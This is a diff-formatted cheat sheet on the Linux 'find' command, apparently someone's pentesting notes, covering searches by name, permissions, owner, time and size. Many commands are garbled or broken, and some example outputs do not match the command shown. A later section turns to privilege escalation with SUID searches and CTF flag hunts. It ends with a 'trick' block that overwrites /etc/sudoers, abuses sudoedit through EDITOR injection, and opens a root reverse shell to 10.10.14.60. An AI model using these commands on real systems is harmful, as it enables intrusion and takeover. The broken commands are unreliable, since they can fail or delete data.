@@ -1,0 +1,330 @@
+Brief summary of using “find” Linux
+
+1. Find files using name in current directory
+  Find all files whose name is dejano.txt in a current working directory.
+  find . -name dejano.txt
+  ./dejan.txt
+ 
+  2. Locate files in home directory
+  Find all files in the /home directory named dejano.txt .
+  # find /home -name dejano.txt
+  /home/dejano.txt
+ 
+  3. Find files using name and ignoring box
+  Find all files whose name is dejano.txt and contain uppercase and lowercase letters in the /home directory.
+  find /home -name dejano.txt
+  ./dejan.txt
+  ./Dejano.txt
+ 
+  4. Find directories using name
+  Find all directories whose name is dejano in the / directory
+  find / -type d -name dejano
+  /run/user/dejano
+  /home/dejan
+  /home/dejano/.macromedia/Flash_Player/#SharedObjects/7SSMPSML/localhost/dejano
+ 
+  5. Find PHP files using name
+Find all php files whose name is dejano.php in a current working directory.
+  find . -type f -name dejano.php
+  ./dejano.php
+ 
+  6. Find all PHP files in the directory
+  Find all php files in a directory.
+  find . -type f -name "*.php"
+  ./dejano.php
+  ./login.php
+  ./index.php
+ 
+  Part II - Find files based on their permissions
+ 
+  7. Find files with 777 permissions
+  Find all files whose permissions are 777.
+  find . -type f -perm 0777 -print
+  ./.tor-browser/Docs/Qt/LICENSE.GPL3
+  ./.tor-browser/Docs/Qt/LICENSE.LGPL
+  ./.tor-browser/Docs/Tor/LICENSE
+  ./.tor-browser/Docs/Tor/README
+  ./.tor-browser/Docs/changelog
+  ./.tor-browser/Docs/README-TorBrowserBundle
+  ./.tor-browser/Docs/Vidalia/LICENSE
+  ./.tor-browser/Docs/Vidalia/LICENSE-GPLV3
+  ./.tor-browser/Docs/Vidalia/LICENSE-LGPLV3
+  ./.tor-browser/Docs/Vidalia/LICENSE-GPLV2
+  ./.tor-browser/Docs/Vidalia/CREDITS
+  ./.tor-browser/App/Firefox/libplc4.so
+ 
+  8. Find files without 777 permissions
+  Find all files without permission 777.
+  find / -type f ! -perm 777
+  /run/ConsoleKit/database
+  /run/teamviewerd.pid
+  /run/libvirtd.pid
+  find: `/run/lightdm': Permission denied
+  /run/acpid.pid
+  /run/NetworkManager/dnsmasq.pid
+  /run/NetworkManager/dnsmasq.conf
+  /run/NetworkManager/NetworkManager.pid
+  /run/clamav/freshclam.pid
+  /run/crond.reboot
+  find: `/run/cups/certs': Permission denied
+  /run/atd.pid
+ 
+  9. Find SGID files with 644 permissions
+  Find all SGID bit files whose permissions set to 644 .
+  find / -perm 2644
+  find: `/proc/5556/task/5556/fd': Permission denied
+  find: `/proc/5556/task/5556/fdinfo': Permission denied
+  find: `/proc/5556/task/5556/ns': Permission denied
+  find: `/proc/5556/fd': Permission denied
+  find: `/proc/5556/map_files': Permission denied
+  find: `/proc/5556/fdinfo': Permission denied
+  find: `/proc/5556/ns': Permission denied
+ 
+  10. Find sticky bit files with 551 permissions
+  Find all sticky bit set files whose permission are 551.
+  find / -perm 1551
+  find: `/var/lib/udisks2': Permission denied
+  find: `/var/lib/polkit-1': Permission denied
+  find: `/var/lib/lightdm': Permission denied
+  find: `/var/spool/cron/atspool': Permission denied
+  find: `/var/spool/cron/crontabs': Permission denied
+  find: `/var/spool/cron/atjobs': Permission denied
+ 
+  11. Find SUID files
+  Find all SUID set files.
+  find / -perm /u=s
+  /usr/sbin/uuidd
+  /usr/sbin/pppd
+  /usr/bin/at
+  /usr/bin/sudo
+  /usr/bin/chsh
+  /usr/bin/gpasswd
+  /usr/bin/traceroute6.iputils
+  /usr/bin/chfn
+ 
+  12. Find SGID files
+  Find all SGID set files.
+  find / -perm /g+s
+  /var/location
+  /var/cache/man
+  /var/cache/man/ca@valencia
+  /var/cache/man/ca@valencia/cat1
+  /var/cache/man/pa
+  /var/cache/man/pa/cat1
+  /var/cache/man/cat3
+  /var/cache/man/he
+  /var/cache/man/he/cat1
+ 
+  13. Find read-only files
+  Find all read-only files
+  find / -perm /u=r
+  /selinux
+  /run
+  /run/udisks2
+  /run/pm-utils
+  /run/pm-utils/pm-powersave
+  /run/pm-utils/pm-powersave/storage
+  /run/pm-utils/locks
+  /run/pppconfig
+ 
+  14. Find executable files
+  Find all executable files.
+  find / -perm /a=x
+ 
+  15. Find files with permissions 777 and chmod to 644
+  Find all 777 permission files and use the chmod command to set the permissions to 644.
+  find / -type f -perm 0777 -print-exec chmod 644 {} ;
+ 
+  16. Find Directories with 777 permissions and chmod to 755
+  Find all 777 permission directories and use the chmod command to set the permissions to 755 .
+  find / -type d -perm 777 -print-exec chmod 755 {} ;
+ 
+  17. Find and remove single file
+  To find a single file called dejano.txt and remove it.
+  find . -type f -name "dejano.txt" -exec rm -f {} ;
+ 
+  18 . Find and remove multiple files
+  To find and remove multiple files like .mp3 or .txt then use .
+  find . -type f -name "*.txt" -exec rm -f {} ;
+  find . -type f -name "*.mp3" -exec rm -f {} ;
+
+  19. Find all empty files
+  To log all empty files
+  find . -type f -name "*.txt" -exec rm -f {} ;
+  find . -type f -name "*.mp3" -exec rm -f {} ;
+
+  19. Find all empty files
+  To log all empty files under certain path .
+  find /tmp -type f -empty
+ 
+Find all empty directories
+  To log all empty directories under certain path .
+  find /tmp -type d -empty
+ 
+  21. Archive all hidden files
+  To find all hidden files, use the command below.
+  find /tmp -type f -name ".*"
+ 
+  Part III - Search Files based on Owners and Groups
+  22. Find single file based on user
+  To find all or single file called dejano.txt under the root directory.
+  find / -user root -name dejano.txt
+ 
+  23. Find all files based on users
+  To find all files belonging to user dejano under /home directory.
+  find /home -user dejano
+ 
+  24. Find all files based on Group
+  To find all files owned by developer group under /home directory.
+  find /home -group developer
+ 
+  25. Find a User's Private Files
+  To find all .txt files for user dejano in his /home directory.
+  find /home -user dejano -iname "*.txt"
+ 
+  Part IV - Finding files and directories based on date and time
+ 
+  26. Find last 50 days modified files
+  To find all files that have been modified in the last 50 days.
+  find / -mtime 50
+ 
+  27. Find the files that were accessed in the last 50 days.
+  To find all files that have been accessed in the last 50 days.
+  find /- atime 50
+ 
+  28. Find files that have been modified within the last 50-100 days.
+  To find all files that were modified more than 50 days ago and less than 100 days ago.
+  find / -mtime +50 -mtime -100
+ 
+  29. Find files changed in the last 1 hour
+  To find all files that have changed in the last hour.
+  find / -cmin -60
+ 
+  30. Find files that have been modified in the last 1 hour
+  To find all files that have been modified in the last hour.
+  find / -mmin -60
+ 
+  31. Find files accessed in the last hour
+  To find all files that have been accessed in the last hour.
+  find / -amin -60
+ 
+  Part V - find files and directories based on size
+ 
+  32. Find 50MB files
+  To find all 50MB files, use .
+  find / -size 50M
+ 
+  33. Find files of varying sizes example: between 50MB - 100MB
+  To find all files that are greater than 50MB and less than 100MB .
+  find / -size 50M -size -100M
+ 
+  34. Find and Delete Files 100MB
+  To find all 100MB files and delete them using a single command.
+  find / -size +100 M- exec rm -rf {} ;
+ 
+  35. Find Specific Files and Delete
+  Find all .mp3 files over 10MB and delete using a single command.
+  find / -type f -name *.mp3 -size +10M -exec ls -l {} ;
+
+
+
+Other interesting and important post privilege escalation examples.
+
+You can use the find command to search for files with the SUID bit set throughout the file system:
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+sudo find / -type f | grep -i "file" 2>/dev/null
+sudo find / -perm -4755 2>/dev/null
+find / -perm -4000 -type f
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -name root.txt 2>/dev/null
+find / -type f -name user.txt 2>/dev/null
+
+1 - Simple search
+find . -name file.txt
+./file.txt
+
+2 - Search ignoring case sensitive
+find /home/ -iname file.txt
+./file.txt
+./File.txt
+
+3 - Search for
+find / -type -d -name Pictures file.txt
+/home/user/Photos
+
+4 - Search with jokers
+find /home/ -name *file*
+./home/archive.txt
+./home/Arquivo.txt
+./home/Meus_Arquivo-NEVOS.txt
+./home/archive.sh
+
+5 - Search by type of files
+find / -type -f -name Photos *.odt
+./file.odt
+./terminalroot.odt
+
+6 - Search for permission and find all files that have permission 777
+find . -type f -perm 0777 -print
+
+7 - Different permission search finds all files that do not have permission 777
+find / -type f ! -perm 777
+
+8 - Looks for files in empty directories without saying if it's -type d or -type f it looks for both
+find MyFolder/ -empty
+MyFolder/DirEmpty
+MyFolder/EmptyFile.txt • -type d searches only directories
+
+find MyFolder/ -type d -empty
+MyFolder/DirEmpty
+  ◇ -type f searches for files only
+
+find MyFolder/ -type f -empty
+MyFolder/EmptyFile.txt
+
+9 - Search for hidden folders
+find /tmp -type f -name ".*"
+
+10 - Search by size will find all files larger than 10 MB
+find . -type f -size +10M Will find all files smaller than 10 MB
+find . -type f -size -10M
+
+11 - Search and remove with -exec
+find . -type f -name emptyfile.txt -exec rm -f {} \;Or with xargs
+find . -type f -name emptyfile.txt | xargs rm -f
+
+12 - Search by name inside the file
+find MyFiles/ -name "*.*" -exec grep -Hin "Anomalies" {} \;
+MyFiles/file.txt:1:Anomalies
+
+13 - Search files ACCESSED (atime) in the last 24 hours (for more than 3 days, use +3)
+find . -type f -atime -1 -exec ls -l {} \;
+
+14 - Search files ACCESSED (amin) in the last 5 minutes
+find . -type f -amin -5
+
+15 - Search files CREATED (ctime) in the last 12 hours
+find . -type f -ctime -0.5 -exec ls -l {} \;
+
+16 - Searches MODIFIED files (mtime) in the last 6 hours
+find . -type f -mtime -0.25
+
+17 - Search for files of type Sticky Bit with permission 551
+find / -perm 1551
+
+18 - Looks for SUID files
+find / -perm /u=s
+19 - Search SGID files
+find / -perm /g+s
+
+20 - Looks for executable files
+find / -perm /a=xou Read-only
+find / -perm /u=rThere are more possibilities, you can see them all in the command manual:
+man find
+
+(trick 1)
+echo "edwards ALL=(ALL:ALL) ALL" > /etc/sudoers
+export EDITOR="nano -- /app/venv/bin/activate"
+sudo -u dev_admin sudoedit /app/config_test.json
+sudo sh -i >& /dev/tcp/10.10.14.60/8080 0>&1
